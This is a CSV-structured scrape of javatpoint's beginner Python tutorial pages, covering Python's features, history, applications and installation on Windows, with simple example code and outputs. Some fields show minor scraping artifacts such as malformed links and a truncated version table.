,main_headings,main_contents,links,image_urls,video_urls,sub_headings_h2,sub_headings_h3,sub_headings_h4,facts,definitions,explanations,codes,outputs,table_data,list_items
0,['Python Tutorial'],['Python tutorial provides basic and advanced concepts of Python. Our Python tutorial is designed for beginners and professionals.'],"['https://www.javatpoint.com/python-features', 'https://www.javatpoint.com/https://training.javatpoint.com/python-training.jsp', 'https://www.javatpoint.com/python-strings', 'https://www.javatpoint.com/python-lists', 'https://www.javatpoint.com/python-tuples', 'https://www.javatpoint.com/python-dictionary', 'https://www.javatpoint.com/python-modules', 'https://www.javatpoint.com/python-exception-handling', 'https://www.javatpoint.com/classification-of-programming-languages', 'https://www.javatpoint.com/python-features', 'https://www.javatpoint.com/python-features']",['https://www.javatpoint.com/corebasic/images/python2.png'],[],"['What is Python', 'Python 2 vs. Python 3 ', 'Python History', 'Why learn Python?', 'Where is Python used?', 'Python Basic Syntax', 'Python First Program', 'Python Popular Frameworks and Libraries', 'Python print() Function', 'Taking Input to the User', 'Python Operators', 'Python Conditional Statements', 'Python Loops', 'Python Data Structures', 'Python Functional Programming', 'Python File I/O', 'Python Modules', 'Python Exceptions', 'Python CSV', 'Python Sending Mail', 'Python Magic Methods', 'Python Oops Concepts', 'Python Advance Topics', 'Python Database Connections', 'Python CGI', 'Prerequisite', 'Audience', 'Problem']","['Example - 1: Return a value', 'Example - 2: Using sep and end argument', 'Python List', 'Python Tuple', 'Python String', 'Dictionaries', 'Python Sets', 'Python Iterator', 'Python Generators', 'Python Decorators', 'Python MySQL', 'Python MongoDB', 'Python SQLite']",[],"['Python is a simple, general purpose, high level, and object-oriented programming language.', 'Python is an interpreted scripting language also. Guido Van Rossum is known as the founder of Python programming.', 'Python is easy to learn yet powerful and versatile scripting language, which makes it attractive for Application Development.', ""Python's syntax and dynamic typing with its interpreted nature make it an ideal language for scripting and rapid application development."", 'Python supports multiple programming pattern, including object-oriented, imperative, and functional or procedural programming styles.', 'A list of differences between Python 2 and Python 3 are given below:', 'Python has the vast community across the world and releases its version within the short period.', 'On the other hand, we can do this using one statement in Python.', 'Both programs will print the same result, but it takes only one statement without using a semicolon or curly braces in Python.', 'The print() function displays the given object to the standard output device (screen) or to the text stream file.', 'Unlike the other programming languages, Python print() function is most unique and versatile function.', 'The syntax of print() function is given below.', ""Let's explain its parameters one by one."", ""Let's understand the following example."", ""Python provides the input() function which is used to take input from the user. Let's understand the following example."", 'By default, the input() function takes the string input but what if we want to take other data types as an input.', 'If we want to take input as an integer number, we need to typecast the input() function into an integer.', 'For example -', 'We can take any type of values using input() function.', 'If we try to print the type of L1, L2, and L3 using type() function then it will come out to be a list.', 'To learn more about list, visit the following tutorial.', 'Tuple can be defined as follows', 'If we try to add new to the tuple, it will throw an error.', 'The above program throws an error because tuples are immutable type. To learn more about tuple, visit the Python Tuples.', ""Python doesn't support the character data-type. A single character written as 'p' is treated as a string of length 1."", ""Stings are also immutable. We can't change after it is declared. To learn more about the string, visit the following tutorial."", 'Keys must be a unique and value can be any type such as integer, list, tuple, etc.', 'It is a mutable type; we can reassign after its creation. Below is the example of creating dictionary in Python.', 'The empty curly braces {} are used to create empty dictionary. To learn more, visit the complete tutorial of the dictionary.', 'To get the more information about sets, visit the following resources.', 'Built-in modules are predefined modules of Python. To use the functionality of the modules, we need to import them into our current working program.', 'An exception can be defined as an unusual condition in a program resulting in the interruption in the flow of the program.', 'To read the oops concept in detail, visit the following resources.', 'Python includes many advance and useful concepts that help the programmer to solve the complex tasks. These concepts are given below.', 'To learn more about the iterators visit our Python Iterators tutorial.', 'The Generators are an easiest way of creating Iterators. To learn more about, visit our Python Generators tutorial.', 'To learn more about, visit the Python Decorators tutorial.', 'Environment Setup', 'Database Connection', 'Creating New Database', 'Creating Tables', 'Insert Operation', 'Read Operation', 'Update Operation', 'Join Operation', 'Performing Transactions', 'Python MongoDB', 'Python SQLite', 'Before learning Python, you must have the basic knowledge of programming concepts.', 'Our Python tutorial is designed to help beginners and professionals.', 'We assure that you will not find any problem in this Python tutorial. But if there is any mistake, please post the problem in contact form.']","['Python is a general purpose, dynamic, high-level, and interpreted programming language. It supports Object Oriented programming approach to develop applications. It is simple and easy to learn and provides lots of high-level data structures.', 'Python is not intended to work in a particular area, such as web programming. That is why it is known as multipurpose programming language because it can be used with web, enterprise, 3D CAD, etc.', ""We don't need to use data types to declare variable because it is dynamically typed so we can write a=10 to assign an integer value in an integer variable."", 'Python makes the development and debugging fast because there is no compilation step included in Python development, and edit-test-debug cycle is very fast.', 'Python was invented by Guido van Rossum in 1991 at CWI in Netherland. The idea of Python programming language has taken from the ABC programming language or we can say that ABC is a predecessor of Python language.', 'There is also a fact behind the choosing name Python. Guido van Rossum was a fan of the popular BBC comedy show of that time, ""Monty Python\'s Flying Circus"". So he decided to pick the name Python for his newly created programming language.', 'Python provides many useful features to the programmer. These features make it most popular and widely used language. We have listed below few-essential feature of Python.', 'Python is a general-purpose, popular programming language and it is used in almost every technical field. The various areas of Python use are given below.', 'In the above example, the statements that are same level to right belong to the function. Generally, we can use four whitespaces to define indentation.', 'Unlike the other programming languages, Python provides the facility to execute the code using few lines. For example - Suppose we want to print the ""Hello World"" program in Java; it will take three lines to print it.', 'Python has wide range of libraries and frameworks widely used in various fields such as machine learning, artificial intelligence, web applications, etc. We define some popular frameworks and libraries of Python as follows.', 'As we can see in the above output, the multiple objects can be printed in the single print() statement. We just need to use comma (,) to separate with each other.', 'Python string is a sequence of characters. It is a collection of the characters surrounded by single quotes, double quotes, or triple quotes. It can also define as collection of the Unicode characters. We can create a string as follows.', 'Python Dictionary is a most efficient data structure and used to store the large amount of data. It stores the data in the key-value pair format. Each value is stored corresponding to its key.', ""A Python set is a collection of unordered elements. Each element in set must be unique and immutable. Sets are mutable which means we can modify anytime throughout the program. Let's understand the example of creating set in Python."", ""We can send or read a mail using the Python script. Python's standard library modules are useful for handling various protocols such as PoP3 and IMAP. We will learn how to send a mail with the popular email service SMTP from a Python script."", 'Python magic method is defined as the special method which adds ""magic"" to a class. It starts and ends with double underscores, for example, _init_ or _str_.', 'The built-in classes define many magic methods. The dir() function can be used to see the number of magic methods inherited by a class. It has two prefixes and suffix underscores in the method name.', 'Everything in Python is treated as an object including integer values, floats, functions, classes, and none. Apart from that, Python supports all oriented concepts. Below is the brief introduction of oops concepts of Python.', 'An iterator is simply an object that can be iterated upon. It returns one object at a time. It can be implemented using the two special methods, __iter__() and __next__().', 'These are used to modify the behavior of the function. Decorators provide the flexibility to wrap another function to expand the working of wrapped function, without permanently modifying it.']","['Our Python tutorial includes all topics of Python Programming such as installation, control statements, Strings, Lists, Tuples, Dictionary, Modules, Exceptions, Date and Time, File I/O, Programs, etc. There are also given Python interview questions to help you better understand Python Programming.', 'In most of the programming languages, whenever a new version releases, it supports the features and syntax of the existing version of the language, therefore, it is easier for the projects to switch in the newer version. However, in the case of Python, the two versions Python 2 and Python 3 are very much different from each other. ', 'There is no use of curly braces or semicolon in Python programming language. It is English-like language. But Python uses the indentation to define a block of code. Indentation is nothing but adding whitespace before the statement when it is needed. For example -', 'In the first print() statement, we use the sep and end arguments. The given object is printed just after the sep values. The value of end parameter printed at the last of given object. As we can see that, the second print() function printed the result after the three black lines.', 'Operators are the symbols which perform various operations on Python objects. Python operators are the most essential to work with the Python data types. In addition, Python also provides identify membership and bitwise operators. We will learn all these operators with the suitable example in following tutorial.', 'Conditional statements help us to execute a particular block for a particular condition. In this tutorial, we will learn how to use the conditional expression to execute a different block of statements. Python provides if and else keywords to set up logical conditions. The elif keyword is also used as conditional statement.', 'Sometimes we may need to alter the flow of the program. The execution of a specific code may need to be repeated several numbers of times. For this purpose, the programming languages provide various types of loops capable of repeating some specific code several times. Consider the following tutorial to understand the statements in detail.', 'Data structures are referred which can hold some data together or we say that they are used to store the data in organized way. Python provides built-in data structures such as list, tuple, dictionary, and set. We can perform complex tasks using data structures.', ""Python list holds the ordered collection of items. We can store a sequence of items in a list. Python list is mutable which means it can be modified after its creation. The items of lists are enclosed within the square bracket [] and separated by the comma. Let's see the example of list."", 'Python Tuple is used to store the sequence of immutable Python objects. The tuple is similar to lists since the value of the items stored in the list can be changed, whereas the tuple is immutable, and the value of the items stored in the tuple cannot be changed.', 'This section of Python tutorial defines some important tools related to functional programming such as lambda and recursive functions. These functions are very efficient in accomplishing the complex tasks. We define a few important functions, such as reduce, map, and filter. Python provides the functools module that includes various functional programming tools. Visit the following tutorial to learn more about functional programming.', 'Files are used to store data in a computer disk. In this tutorial, we explain the built-in file object of Python. We can open a file using Python script and perform various operations such as writing, reading, and appending. There are various ways of opening a file. We are explained with the relevant example. We will also learn to perform read/write operations on binary files.', 'Python modules are the program files that contain a Python code or functions. There are two types of module in the Python - User-define modules and built-in modules. A module that the user defines, or we can say that our Python code saved with .py extension, is treated as a user-define module.', 'Whenever an exception occurs, the program stops the execution, and thus the further code is not executed. Therefore, an exception is the run-time errors that are unable to handle to Python script. An exception is a Python object that represents an error.', 'A csv stands for ""comma separated values"", which is defined as a simple file format that uses specific structuring to arrange tabular data. It stores tabular data such as spreadsheet or database in plain text and has a common format for data interchange. A csv file opens into the excel sheet, and the rows and columns data define the standard format. Visit the following tutorial to learn the CSV module in detail.', 'We can use various databases along with Python. You can learn the full tutorial to visit below resources. Python DBI-API acclaims standard sets of functionality to be included in the database connectivity modules for respective RDBMS products. We explain all important database connectivity using Python DBI-API.', 'Python CGI stands for ""Common Gateway Interface"", which is used to define how to exchange information between the webserver and a custom Python scripts. The Common Gateway Interface is a standard for external gateway programs to interface with the server, such as HTTP Servers. To learn more about Python CGI, visit the following tutorial.']","['def func():', 'statement 1', 'statement 2', '…………………', '…………………', 'statement N', 'public class HelloWorld {', 'public static void main(String[] args){', 'System.out.println(""Hello World"");', 'print(""Hello World"")', ""print(*objects, sep=' ', end='\\n', file=sys.stdout, flush=False)"", 'print(""Welcome to javaTpoint."")', '# Two objects are passed in print() function', 'print(""a ="", a)', '# Three objects are passed in print function', ""print('a =', a, '= b')"", 'print(""a ="", a, sep=\'dddd\', end=\'\\n\\n\\n\')', 'print(""a ="", a, sep=\'0\', end=\'$$$$$\')', 'name = input(""Enter a name of student:"")', 'print(""The student name is: "", name)', 'a  = int(input(""Enter first number: ""))', 'b = int(input(""Enter second number: ""))', 'print(a+b)', 'L1 = [""John"", 102, ""USA""]', 'L2 = [1, 2, 3, 4, 5, 6]', 'print(type(L1))', 'print(type(L2))', 'tup = (""Apple"", ""Mango"" , ""Orange"" , ""Banana"")', 'print(type(tup))', 'print(tup)', 'tup = (""Apple"", ""Mango"" , ""Orange"" , ""Banana"")', 'tup[2] = ""Papaya""', 'print(tup)', '# Creating string using double quotes', 'str1 = ""Hi Python""', 'print(str1)', '# Creating string using single quotes', ""str1 = 'Hi Python'"", 'print(str1)', '# Creating string using triple quotes', ""str1 = '''Hi Python'''"", 'print(str1)', 'employee = {""Name"": ""John"", ""Age"": 29, ""salary"":250000,""Company"":""GOOGLE""}', 'print(type(employee))', 'print(""printing Employee data .... "")', 'print(employee)', '# Creating Set', 'Month = {""January"", ""February"", ""March"", ""April"", ""May"", ""June"", ""July""}', 'print(Month)', 'print(type(Month))']","['Welcome to javaTpoint.\na = 10\na = 10 = b', 'a =dddd10\n\n\na =010$$$$$', 'Enter a name of student: Devansh\nThe student name is:   Devansh', 'Enter first number: 50\nEnter second number: 100\n150', ""<class 'list'>\n<class 'list'>"", ""<class 'tuple'>\n('Apple', 'Mango', 'Orange', 'Banana')"", 'Traceback (most recent call last):\n  File ""C:/Users/DEVANSH SHARMA/PycharmProjects/Hello/gamewithturtle.py"", line 3, in \n    tup[2] = ""Papaya""\nTypeError: \'tuple\' object does not support item assignment', 'Hi Python\nHi Python\nHi Python', ""<class 'dict'>\nPrinting Employee data .... \n{'Name': 'John', 'Age': 29, 'salary': 250000, 'Company': 'GOOGLE'}"", ""{'March', 'July', 'April', 'May', 'June', 'February', 'January'}\n<class 'set'>""]",[],"['|||Easy to use and Learn|||Expressive Language|||Interpreted Language|||Object-Oriented Language|||Open Source Language|||Extensible|||Learn Standard Library|||GUI Programming Support|||Integrated|||Embeddable|||Dynamic Memory Allocation|||Wide Range of Libraries and Frameworks||||||Data Science|||Date Mining|||Desktop Applications|||Console-based Applications|||Mobile Applications|||Software Development|||Artificial Intelligence|||Web Applications|||Enterprise Applications|||3D CAD Applications|||Machine Learning|||Computer Vision or Image Processing Applications.|||Speech Recognitions||||||Web development (Server-side) - Django Flask, Pyramid, CherryPy|||GUIs based applications - Tk, PyGTK, PyQt, PyJs, etc.|||Machine Learning - TensorFlow, PyTorch, Scikit-learn, Matplotlib, Scipy, etc.|||Mathematics - Numpy, Pandas, etc.||||||objects - An object is nothing but a statement that to be printed. The * sign represents that there can be multiple statements.|||sep - The sep parameter separates the print values. Default values is \' \'.|||end - The end is printed at last in the statement.|||file - It must be an object with a write(string) method.|||flush - The stream or file is forcibly flushed if it is true. By default, its value is false.||||||Python Operators||||||Python if..else statement||||||Python Loops|||Python For Loop|||Python While Loop||||||Python List|||Python List Functions||||||Python Tuple||||||Python Strings |||Python String Method||||||Python Dictionary|||Python Dictionary Methods||||||Python Sets|||Python Set Methods||||||Python Function|||Python map() Function|||Python filter() Function|||Python reduce() Function|||Python functool Module|||Python Lambda Function||||||Python File I/O||||||Python Modules||||||Python Exceptions||||||Python Read CSV File|||Python Write CSV File||||||Python Sending Emails||||||Python Magic Methods||||||Classes and Objects - Python classes are the blueprint of the object. An object is a collection of data and method that act on the data.|||Inheritance - An inheritance is a technique where one class inherits the properties of other classes.|||Constructor - Python provides a special method __init__() which is known as a constructor. This method is automatically called when an object is instantiated.|||Data Member - A variable that holds data associated with a class and its objects.||||||Python Oops Concepts|||Python Object and classes|||Python Constructor|||Python Inheritance|||Python Polymorphism||||||Python CGI|||&&&|||Python 2 uses print as a statement and used as print ""something"" to print some string on the console. On the other hand, Python 3 uses print as a function and used as print(""something"") to print something on the console.|||Python 2 uses the function raw_input() to accept the user\'s input. It returns the string representing the value, which is typed by the user. To convert it into the integer, we need to use the int() function in Python. On the other hand, Python 3 uses input() function which automatically interpreted the type of input entered by the user. However, we can cast this value to any type by using primitive functions (int(), str(), etc.). |||In Python 2, the implicit string type is ASCII, whereas, in Python 3, the implicit string type is Unicode.|||Python 3 doesn\'t contain the xrange() function of Python 2. The xrange() is the variant of range() function which returns a xrange object that works similar to Java iterator. The range() returns a list for example the function range(0,3) contains 0, 1, 2. |||There is also a small change made in Exception handling in Python 3. It defines a keyword as which is necessary to be used. We will discuss it in Exception handling section of Python programming tutorial.|||']"
1,['Python Features'],"['Python provides many useful features which make it popular and valuable from the other programming languages. It supports object-oriented programming, procedural programming approaches and provides dynamic memory allocation. We have listed below a few essential features.']","['https://www.javatpoint.com/python-history', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.python.org/', 'https://www.javatpoint.com/python-history', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-history']",[],[],[],"['1) Easy to Learn and Use', '2) Expressive Language', '3) Interpreted Language', '4) Cross-platform Language', '5) Free and Open Source', '6) Object-Oriented Language', '7) Extensible', '8) Large Standard Library', '9) GUI Programming Support', '10) Integrated', '11. Embeddable', '12. Dynamic Memory Allocation']",[],[],"['Python can perform complex tasks using a few lines of code. A simple example, the hello world program you simply type print(""Hello World""). It will take only one line to execute, while Java or C takes multiple lines.', 'Python is an interpreted language; it means the Python program is executed one line at a time. The advantage of being interpreted language, it makes debugging easy and portable. ', 'It implies that other languages such as C/C++ can be used to compile the code and thus it can be used further in our Python code. It converts the program into byte code, and any platform can use that byte code. ', 'Graphical User Interface is used for the developing Desktop application. PyQT5, Tkinter, Kivy are the libraries which are used for developing the web application.', 'It can be easily integrated with languages like C, C++, and JAVA, etc. Python runs code line by line like C,C++ Java. It makes easy to debug the code.', 'The code of the other programming language can use in the Python source code. We can use Python source code in another programming language as well. It can embed other language into our code.']","['Python is easy to learn as compared to other programming languages. Its syntax is straightforward and much the same as the English language. There is no use of the semicolon or curly-bracket, the indentation defines the code block. It is the recommended programming language for beginners. ', 'Python can run equally on different platforms such as Windows, Linux, UNIX, and Macintosh, etc. So, we can say that Python is a portable language. It enables programmers to develop the software for several competing platforms by writing a program only once. ', 'Python is freely available for everyone. It is freely available on its official website www.python.org. It has a large community across the world that is dedicatedly working towards make new python modules and functions. Anyone can contribute to the Python community. The open-source means, ""Anyone can download its source code without paying any penny.""', 'Python supports object-oriented language and concepts of classes and objects come into existence. It supports inheritance, polymorphism, and encapsulation, etc. The object-oriented procedure helps to programmer to write reusable code and develop applications in less code. ', 'It provides a vast range of libraries for the various fields such as machine learning, web developer, and also for the scripting. There are various machine learning libraries, such as Tensor flow, Pandas, Numpy, Keras, and Pytorch, etc. Django, flask, pyramids are the popular framework for Python web development.', ""In Python, we don't need to specify the data-type of the variable. When we assign some value to the variable, it automatically allocates the memory to the variable at run time. Suppose we are assigned integer value 15 to x, then we don't need to write int x = 15. Just write x = 15.""]",[],[],[],[]
2,['Python History and Versions'],"['There is a fact behind choosing the name Python. Guido van Rossum was reading the script of a popular BBC comedy series ""Monty Python\'s Flying Circus"". It was late on-air 1970s.']","['https://www.javatpoint.com/python-applications', 'https://www.javatpoint.com/python-features', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/machine-learning', 'https://www.javatpoint.com/https://www.javatpoint.com/artificial-intelligence-tutorial', 'https://www.javatpoint.com/javatpoint.com/mobile-application-testing', 'https://www.javatpoint.com/https://www.javatpoint.com/tensorflow', 'https://www.javatpoint.com/https://www.javatpoint.com/django-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/flask-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-pandas', 'https://www.javatpoint.com/https://www.javatpoint.com/keras', 'https://www.javatpoint.com/https://www.javatpoint.com/data-science', 'https://www.javatpoint.com/https://www.javatpoint.com/artificial-intelligence-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/machine-learning', 'https://www.javatpoint.com/https://www.javatpoint.com/robotics-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/iot-internet-of-things', 'https://www.javatpoint.com/https://www.javatpoint.com/python-applications', 'https://www.javatpoint.com/python-applications', 'https://www.javatpoint.com/python-features', 'https://www.javatpoint.com/python-applications']",[],[],"['Why the Name Python?', 'Python Version List', 'Tips to Keep in Mind While Learning Python', 'Usage of Python']","['1. Make it Clear Why We Want to Learn', '2. Learn the Basic Syntax', '3. Write Code by Own', '4. Keep Practicing', '5. Make Notes as Needed', '6. Discuss Concepts with Other', '7. Do small Projects', '8. Teach Others', '9. Explore Libraries and Frameworks', '10. Contribute to Open Source']","['Note - Learn Python 3, not Python 2.7, because the industry no longer uses it. Our Python tutorial is based on its latest version Python 3.']","['The comedy series was creative and well random. It talks about everything. Thus it is slow and unpredictable, which made it very interesting.', 'A list of Python versions with its released date is given below.', 'The proper way of learning will help us to learn fast and become a good Python developer.', 'In this section, we will discuss various tips that we should keep in mind while learning Python.', 'Choose any one or two areas according to your interest and start the journey towards learning Python.', 'Consistency is the key of success in any aspect of life not only in programming. Writing code daily will help to develop muscle memory.', 'Maintain own notes are also helped to learn fast. A study published in Psychological Science that -', 'Once you get handy with a small project, you can easily shift toward your interesting domain (Machine Learning, Web Development, etc.).', 'There are many libraries in Python. Above, we have mentioned a few of them.', ""In the next topic, we will discuss the Python Application, where we have defined Python's usage in detail.""]","['Van Rossum wanted to select a name which unique, sort, and little-bit mysterious. So he decided to select naming Python after the ""Monty Python\'s Flying Circus"" for their newly created programming language.', 'Python is also versatile and widely used in every technical field, such as Machine Learning, Artificial Intelligence, Web Development, Mobile Application, Desktop Application, Scientific Calculation, etc.', 'Python programming language is being updated regularly with new features and supports. There are lots of update in Python versions, started from 1994 to current release.', 'The most common question asked by the beginners - ""What is the best way to learn Python""? It is the initial and relevant question because first step in learning any programming language is to know how to learn.', 'So, first figure out the motivation behind learning, which can anything be such as knowing something new, develop projects using Python, switch to Python, etc. Below are the general areas where Python is widely used. Pick any of them.', 'So it will take minimum amount of time to learning its syntax. Once we get its syntax properly, further learning will be easier and quicker getting to work on projects.', ""There are many editors available for Python programming which highlights the syntax related issue automatically. So we don't need to pay lot of attention of these mistakes."", 'The next important step is to do the practice. It needs to implementing the Python concepts through the code. We should be consistence to our daily coding practice.']","[""The goal should be clear before learning the Python. Python is an easy, a vast language as well. It includes numbers of libraries, modules, in-built functions and data structures. If the goal is unclear then it will be a boring and monotonous journey of learning Python. Without any clear goal, you perhaps won't make it done."", ""It is the most essential and basic step to learn the syntax of the Python programming language. We have to learn the basic syntax before dive deeper into learning it. As we have discussed in our earlier tutorial, Python is easy to learn and has a simple syntax. It doesn't use semicolon and brackets. Its syntax is like the English language."", 'Writing the code is the most effective and robust way to learn Python. First, try to write code on paper and run in mind (Dry Run) then move to the system. Writing code on paper will help us get familiar quickly with the syntax and the concept store in the deep memory. While writing the code, try to use proper functions and suitable variables names.', 'We can do the problem exercise of related concepts or solve at least 2 or 3 problems of Python. It may seem hard but muscle memory plays large part in programing. It will take us ahead from those who believe only the reading concept of Python is sufficient.', 'Creating notes by own is an excellent method to learn the concepts and syntax of Python. It will establish stability and focus that helps you become a Python developer. Make brief and concise notes with relevant information and include appropriate examples of the subject concerned.', 'Coding seems to be solitary activity, but we can enhance our skills by interacting with the others. We should discuss our doubts to the expert or friends who are learning Python. This habit will help to get additional information, tips and tricks, and solution of coding problems. One of the best advantages of Python, it has a great community. Therefore, we can also learn from passionate Python enthusiasts.', ""After understanding Python's basic concept, a beginner should try to work on small projects. It will help to understand Python more deeply and become more component in it. Theoretical knowledge is not enough to get command over the Python language. These projects can be anything as long as they teach you something. You can start with the small projects such as calculator app, a tic-toc-toe game, an alarm clock app, a to-do list, student or customer management system, etc."", 'There is a famous saying that ""If you want to learn something then you should teach other"". It is also true in case of learning Python. Share your information to other students via creating blog posts, recording videos or taking classes in local training center. It will help us to enhance the understanding of Python and explore the unseen loopholes in your knowledge. If you don\'t want to do all these, join the online forum and post your answers on Python related questions.', ""Python consists of vast libraries and various frameworks. After getting familiar with Python's basic concepts, the next step is to explore the Python libraries. Libraries are essential to work with the domain specific projects. In the following section, we describe the brief introduction of the main libraries."", 'As we know, Python is an open source language that means it is freely available for everyone. We can also contribute to Python online community to enhance our knowledge. Contributing to open source projects is the best way to explore own knowledge. We also receive the feedback, comments or suggestions for work that we submitted. The feedback will enable the best practices for Python programming and help us to become a good Python developer.', 'Python is a general purpose, open source, high-level programming language and also provides number of libraries and frameworks. Python has gained popularity because of its simplicity, easy syntax and user-friendly environment. The usage of Python as follows.']",[],[],"['ython VersionReleased Dat&&&ython 1.0January 199&&&ython 1.5December 31, 199&&&ython 1.6September 5, 200&&&ython 2.0October 16, 200&&&ython 2.1April 17, 200&&&ython 2.2December 21, 200&&&ython 2.3July 29, 200&&&ython 2.4November 30, 200&&&ython 2.5September 19, 200&&&ython 2.6October 1, 200&&&ython 2.7July 3, 201&&&ython 3.0December 3, 200&&&ython 3.1June 27, 200&&&ython 3.2February 20, 201&&&ython 3.3September 29, 201&&&ython 3.4March 16, 201&&&ython 3.5September 13, 201&&&ython 3.6December 23, 201&&&ython 3.7June 27, 201&&&ython 3.8October 14, 201']","['|||Python laid its foundation in the late 1980s.|||The implementation of Python was started in December 1989 by Guido Van Rossum at CWI in Netherland.|||In February 1991, Guido Van Rossum published the code (labeled version 0.9.0) to alt.sources.|||In 1994, Python 1.0 was released with new features like lambda, map, filter, and reduce.|||Python 2.0 added new features such as list comprehensions, garbage collection systems.|||On December 3, 2008, Python 3.0 (also called ""Py3K"") was released. It was designed to rectify the fundamental flaw of the language.|||ABC programming language is said to be the predecessor of Python language, which was capable of Exception Handling and interfacing with the Amoeba Operating System.|||The following programming languages influence Python:||||||ABC language.|||Modula-3|||||||||ABC language.|||Modula-3||||||Data Analysis and Processing|||Artificial Intelligence|||Games|||Hardware/Sensor/Robots|||Desktop Applications||||||TensorFlow - It is an artificial intelligence library which allows us to create large scale AI based projects.|||Django - It is an open source framework that allows us to develop web applications. It is easy, flexible, and simple to manage.|||Flask - It is also an open source web framework. It is used to develop lightweight web applications.|||Pandas - It is a Python library which is used to perform scientific computations.|||Keras - It is an open source library, which is used to work around the neural network.||||||Desktop Applications|||Web Applications|||Data Science|||Artificial Intelligence|||Machine Learning|||Scientific Computing|||Robotics|||Internet of Things (IoT)|||Gaming|||Mobile Apps|||Data Analysis and Preprocessing|||']"
3,['Python Applications'],['Python is known for its general-purpose nature that makes it applicable in almost every domain of software development. Python makes its presence in every emerging field. It is the fastest-growing programming language and can develop any application.'],"['https://www.javatpoint.com/how-to-install-python', 'https://www.javatpoint.com/python-history', 'https://www.javatpoint.com/how-to-install-python', 'https://www.javatpoint.com/python-history', 'https://www.javatpoint.com/how-to-install-python']",['https://static.javatpoint.com/python/images/python-applications.png'],[],[],"['1) Web Applications', '2) Desktop GUI Applications', '3) Console-based Application', '4) Software Development', '5) Scientific and Numeric', '6) Business Applications', '7) Audio or Video-based Applications', '8) 3D CAD Applications', '9) Enterprise Applications', '10) Image Processing Application']",[],"['Here, we are specifying application areas where Python can be applied.', 'Python is useful for the software development process. It works as a support language and can be used to build control and management, testing, etc.']","['The GUI stands for the Graphical User Interface, which provides a smooth interaction to any application. Python provides a Tk GUI library to develop a user interface. Some popular GUI libraries are given below.', 'Business Applications differ from standard applications. E-commerce and ERP are an example of a business application. This kind of application requires extensively, scalability and readability, and Python provides all these features.', 'Oddo is an example of the all-in-one Python-based application which offers a range of business applications. Python provides a Tryton platform which is used to develop the business application.', 'Python is flexible to perform multiple tasks and can be used to create multimedia applications. Some multimedia applications which are made by using Python are TimPlayer, cplay, etc. The few multimedia libraries are given below.', 'The CAD (Computer-aided design) is used to design engineering related architecture. It is used to develop the 3D representation of a part of a system. Python can create a 3D CAD application by using the following functionalities.', 'Python can be used to create applications that can be used within an Enterprise or an Organization. Some real-time applications are OpenERP, Tryton, Picalo, etc.', 'Python contains many libraries that are used to work with the image. The image can be manipulated according to our requirements. Some libraries of image processing are given below.', 'In this topic, we have described all types of applications where Python plays an essential role in the development of these applications. In the next tutorial, we will learn more concepts about Python.']","[' We can use Python to develop web applications. It provides libraries to handle internet protocols such as HTML and XML, JSON, Email processing, request, beautifulSoup, Feedparser, etc. One of Python web-framework named Django is used on Instagram. Python provides many useful frameworks, and these are given below:', 'Console-based applications run from the command-line or shell. These applications are computer program which are used commands to execute. This kind of application was more popular in the old generation of computers. Python can develop this kind of application very effectively. It is famous for having REPL, which means the Read-Eval-Print Loop that makes it the most suitable language for the command-line applications.', 'Python provides many free library or module which helps to build the command-line apps. The necessary IO libraries are used to read and write. It helps to parse argument and create console help text out-of-the-box. There are also advance libraries that can develop independent console apps.', 'This is the era of Artificial intelligence where the machine can perform the task the same as the human. Python language is the most suitable language for Artificial intelligence or machine learning. It consists of many scientific and mathematical libraries, which makes easy to solve complex calculations.', 'Implementing machine learning algorithms require complex mathematical calculation. Python has many libraries for scientific and numeric such as Numpy, Pandas, Scipy, Scikit-learn, etc. If you have some basic knowledge of Python, you need to import libraries on the top of the code. Few popular frameworks of machine libraries are given below.']",[],[],[],['|||Django and Pyramid framework(Use for heavy applications)|||Flask and Bottle (Micro-framework)|||Plone and Django CMS (Advance Content management)||||||Tkinter or Tk|||wxWidgetM|||Kivy (used for writing multitouch applications )|||PyQt or Pyside||||||SCons is used to build control.|||Buildbot and Apache Gumps are used for automated continuous compilation and testing.|||Round or Trac for bug tracking and project management.||||||SciPy|||Scikit-learn|||NumPy|||Pandas|||Matplotlib||||||Gstreamer|||Pyglet|||QT Phonon||||||Fandango (Popular )|||CAMVOX|||HeeksCNC|||AnyCAD|||RCAM||||||OpenCV|||Pillow|||SimpleITK|||']
4,['How to Install Python (Environment Set-up)'],"['In order to become Python developer, the first step is to learn how to install or update Python on a local machine or computer. In this tutorial, we will discuss the installation of Python on various operating systems. ']","['https://www.javatpoint.com/python-example', 'https://www.javatpoint.com/python-applications', 'https://www.javatpoint.com/https://www.python.org/downloads/', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/windows', 'https://www.javatpoint.com/how-to-install-python-on-mac', 'https://www.javatpoint.com/how-to-install-python-on-centos', 'https://www.javatpoint.com/how-to-install-python-in-ubuntu', 'https://www.javatpoint.com/python-example', 'https://www.javatpoint.com/python-applications', 'https://www.javatpoint.com/python-example']","['https://static.javatpoint.com/python/images/python-environment-set-up.png', 'https://static.javatpoint.com/python/images/python-environment-set-up2.png', 'https://static.javatpoint.com/python/images/python-environment-set-up3.png', 'https://static.javatpoint.com/python/images/python-environment-set-up4.png']",[],['Installation on Windows'],[],[],"[""Step - 1: Select the Python's version to download."", 'Click on the download button.', 'Step - 2: Click on the Install Now', 'Step - 3 Installation in Process', 'Now, try to run python on the command prompt. Type the command python -version in case of python3.', 'We are ready to work with the Python.']","['Visit the link https://www.python.org/downloads/ to download the latest release of Python. In this process, we will install Python 3.8.6 on our Windows operating system. When we click on the above link, it will bring us the following page.', 'Double-click the executable file, which is downloaded; the following window will open. Select Customize installation and proceed. Click on the Add Path check box, it will set the Python path automatically.', 'We can also click on the customize installation to choose desired location and features. Other important thing is install launcher for the all user must be checked.', 'To install python3 on MacOS, visit the link https://www.javatpoint.com/how-to-install-python-on-mac and follow the instructions given in the tutorial.', 'To install Python3 on CentOS, visit the link https://www.javatpoint.com/how-to-install-python-on-centos and follow the instructions given in the tutorial.', 'To install Python3 on Ubuntu, visit the link https://www.javatpoint.com/how-to-install-python-in-ubuntu and follow the instructions given in the tutorial.']",[],[],[],[],[]
